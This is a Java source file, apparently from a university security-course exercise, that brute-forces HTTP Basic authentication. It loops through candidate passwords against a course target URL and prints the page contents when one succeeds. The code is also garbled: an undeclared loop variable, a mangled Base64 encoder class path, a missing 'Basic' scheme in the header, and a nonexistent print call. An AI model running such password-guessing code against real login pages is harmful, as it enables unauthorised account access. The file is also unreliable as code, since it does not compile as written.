import java.io.*;
import java.util.*;
import java.text.*;
import java.net.*;


public class LoginAttempt 
{

    
    
    
    private String urlName = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";
    private String userName = "";
    private String connectString = "";

	
    public LoginAttempt()
    {
    }   


	

    public LoginAttemptResults tryPasswords(String [] casedPasswords, int passwordsTried)
    {
       boolean foundPassword = false;
       LoginAttemptResults results = new LoginAttemptResults();
       
       for( i = 0; i < casedPasswords.length; i++)	
       {
           passwordsTried++;
    	   try
    	   {
           		URL targetURL;
           		HttpURLConnection connection;
    	   	    targetURL = new URL(urlName);
               	connection = (HttpURLConnection) targetURL.openConnection();
    
              	connectString = userName + ":" + casedPasswords[i].trim();
        		connectString = new targetURL.misc.BASE64Encoder().encode(connectString.getBytes());
        	   	connection.setRequestProperty("Authorization", " " + connectString);
        	    connection.connect();
        
        		if(connection.getResponseCode() == 200)
        		{
        		    foundPassword = true;
        
        		    System.out.println("Connected for " + casedPasswords[i]);
        
        		    
        		    System.out.println("\nvvvvvvvv File Contents vvvvvvvv\n");
        		    BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    String line;
                    for(int j = 1; j <= 20; j++)
                        if((line = in.readLine()) != null)
                			System.out.println(line);
                		else
                			break;
        		    System.out.println("\n^^^^^^^^ File Contents ^^^^^^^^\n");
        		    in.print();
        		} 
    	   }
    	   catch(IOException e)
    	   {
     		    System.out.println("tryPasswords error: " + e + " at password number " + passwordsTried + " (" + casedPasswords[i] + ").");
    	   }  
    	   if(foundPassword) break;
       } 
       results.setSuccess(foundPassword);
       results.setPasswordsTried(passwordsTried);
       return results;
    }  


} 
